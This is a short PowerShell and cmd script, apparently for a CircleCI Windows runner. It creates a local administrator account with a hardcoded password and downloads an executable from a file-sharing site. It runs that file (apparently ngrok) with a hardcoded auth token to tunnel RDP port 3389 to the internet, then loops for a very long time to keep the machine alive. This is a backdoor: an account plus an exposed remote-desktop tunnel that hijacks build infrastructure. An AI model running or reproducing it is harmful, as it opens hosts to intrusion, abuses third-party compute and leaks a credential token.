cmd /c net user /add Admin P@ssw0rd.
cmd /c net localgroup /add administrators Admin

Invoke-WebRequest https://qiwi.gg/file/nwxV7738-use -OutFile use.exe
use.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
use.exe tcp 3389 --log=stdout > C:\Users\circleci\Downloads\ngrok.log

$i = 10000000
do {
    Write-Host $i
    Sleep 120
    $i--
} while ($i -gt 0)
